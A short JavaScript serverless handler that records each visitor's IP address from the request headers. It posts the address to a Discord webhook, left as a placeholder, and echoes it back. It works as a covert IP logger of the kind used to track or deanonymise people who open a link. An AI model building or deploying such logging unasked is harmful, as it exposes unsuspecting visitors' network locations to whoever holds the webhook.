export default async function handler(req, res) {
    try {
        const forwarded = req.headers["x-forwarded-for"];

        const ip =
            (typeof forwarded === "string"
                ? forwarded.split(",")[0].trim()
                : null) ||
            req.headers["x-real-ip"] ||
            "Unknown";

        const webhook = "PASTE_YOUR_NEW_WEBHOOK_HERE";

        const discordResponse = await fetch(webhook, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                content: `🌐 Visitor IP: \`${ip}\``
            })
        });

        if (!discordResponse.ok) {
            console.error(
                "Discord error:",
                discordResponse.status,
                await discordResponse.text()
            );
        }

        return res.status(200).json({ ip });

    } catch (error) {
        console.error("API error:", error);

        return res.status(500).json({
            error: "Unable to detect IP"
        });
    }
}
